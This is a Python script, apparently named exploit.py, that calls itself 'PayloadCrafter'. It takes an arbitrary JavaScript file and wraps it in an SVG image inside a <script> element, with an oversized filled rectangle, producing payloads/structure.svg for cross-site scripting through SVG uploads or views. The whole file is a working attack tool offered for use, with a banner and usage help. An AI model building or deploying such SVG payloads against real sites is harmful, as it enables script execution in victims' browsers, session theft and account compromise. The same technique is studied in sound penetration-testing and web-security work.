import os, argparse, time

from colorama import Fore, Back, Style

class Modules:

    def __clear__():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

class Colors:

    global red, green, blue, yellow, reset

    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    blue = Fore.LIGHTBLUE_EX
    yellow = Fore.LIGHTYELLOW_EX
    reset = Style.RESET_ALL

class Banner:

    def banner():
        print(f"""
   ___            _                 _   ___           __ _            
  / _ \__ _ _   _| | ___   __ _  __| | / __\ __ __ _ / _| |_ ___ _ __ 
 / /_)/ _` | | | | |/ _ \ / _` |/ _` |/ / | '__/ _` | |_| __/ _ \ '__|
/ ___/ (_| | |_| | | (_) | (_| | (_| / /__| | | (_| |  _| ||  __/ |   
\/    \__,_|\__, |_|\___/ \__,_|\__,_\____/_|  \__,_|_|  \__\___|_|   
            |___/     
                                                
""")

class Arguments:

    global args

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", help="Javascript PayLoad")
    args = parser.parse_args()

class Errors:

    def provide():
        print("""
            [?] Please provide a payload
            Usage: python3 exploit.py -p <file.js>

            Help:
            -h, --help       Help Menu
            -p, --payload    Javascript(payload.js) PayLoad
            """)
        exit()

class Craft:

    def check_file():
        if os.path.exists(args.payload):
            print(f"[{green}!{reset}] Payload file found")
        else:
            print(f"Err:")
            print(f"    [{red}!{reset}] File {args.payload} was not found")
            print(f"    [{green}?{reset}] Please provide a valid payload file")
            exit()
    
    def check_folder():
        if os.path.exists("payloads"):
            print(f"[{green}!{reset}] Payloads folder found")
        else:
            print(f"[{red}!{reset}] Folder payloads was not found")
            print(f"[{yellow}-{reset}] Creating payloads folder")
            time.sleep(2)
            os.mkdir("payloads")

    def read_payload_file():
        global read_payload
        print(f"[{yellow}-{reset}] Reading payload file")
        time.sleep(2)
        with open(args.payload, "r") as data:
            read_payload = data.read()

    def write_payload_file():
        PAYLOAD = f"""<?xml version="1.0" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="1000000000000000000000" height="1000000000000000000000" style="fill:rgb(25,25,25);stroke-width:3;stroke:rgb(25,25,25)" />
    <script type="text/javascript">
        {read_payload}
    </script>
</svg>"""

        with open("payloads/structure.svg", "w") as f:
            print(f"[{yellow}-{reset}] Crafting payload file")
            time.sleep(2)
            f.write(PAYLOAD)
            print(f"[{green}*{reset}] Payload is crafted in payloads/structure.svg")

    def start_crafter():
    
        if args.payload == None:
            Errors.provide()
        else:
            Modules.__clear__()
            Banner.banner()
            Craft.check_file()
            Craft.check_folder()
            Craft.read_payload_file()
            Craft.write_payload_file()

Craft.start_crafter()
